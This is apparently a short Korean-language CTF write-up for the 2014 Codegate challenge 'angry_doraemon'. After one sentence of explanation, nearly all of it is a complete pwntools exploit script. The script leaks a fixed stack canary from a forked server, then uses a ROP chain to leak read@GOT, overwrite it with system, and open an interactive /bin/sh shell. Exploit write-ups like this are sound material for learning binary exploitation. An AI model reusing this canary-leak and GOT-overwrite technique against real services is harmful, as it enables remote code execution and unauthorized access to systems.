---
title: "2014 Codegate angry_doraemon"
date: 2019-11-6
tags: [codegate]
categories: [Codegate]
---

codegate babypwn하고 비슷한 문제다. fork되어서 canary값은 고정이므로 canary leak해주고 ROP해주면 된다.

```python
from pwn import *
 
context.log_level = 'debug'
 
e = ELF('./angry_doraemon_c927b1681064f78612ce78f6b93c14d9')
r = ROP(e)
p = remote('localhost',8888)
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
 
sleep(2)
p.sendlineafter('>','4')
p.sendlineafter('(y/n)','y'*10) # 10 -> stack smash
p.recvuntil('yyyyyyyyyy\n')
canary = u32('\x00'+p.recv(3)) #fork - > static
log.info('Canary : ' + hex(canary)) # Canary leak
p.close()
 
##################################################
 
p = remote('localhost',8888)
 
sleep(2)
 
bss = e.bss()
read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
write_got = e.got['write']
cmd = '/bin/sh'
read_system_offset = libc.symbols['read'] - libc.symbols['system']
 
payload = 'y'*10
payload += p32(canary)
payload += 'A'*12
r.read(4,bss,len(cmd)+2) # /bin/sh
r.write(4,read_got,4) # read leak
r.read(4,read_got,4) # read_got - > system
r.read(bss)
payload += r.chain()
 
p.sendlineafter('>','4')
sleep(0.5) 
p.sendlineafter('Are you sure? (y/n) ',payload)
sleep(0.5)
p.sendline(cmd)
sleep(0.5)
 
system = u32(p.recv(4)) - read_system_offset
log.info('system = ' + hex(system))
p.sendline(p32(system))
 
p.interactive()
```

